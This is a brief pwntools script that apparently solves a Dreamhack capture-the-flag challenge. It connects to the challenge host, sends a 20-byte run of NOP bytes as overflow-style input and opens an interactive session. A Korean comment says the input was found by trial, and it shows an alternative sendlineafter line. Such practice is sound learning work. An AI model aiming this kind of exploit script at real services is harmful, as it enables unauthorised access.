#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 15514)

prefix = "\x90"*20

p.send(prefix)
p.interactive()

"""
C 파일을 확인하지 않고 풀기위해 이것저것 값을 집어넣다가 얻어걸렸다.
다른 풀이를 보다보니 pwntools을 사용할 때 다음과 같은 방법도 있더라..
p.sendlineafter("Name: ", 'a' * 20)
"""
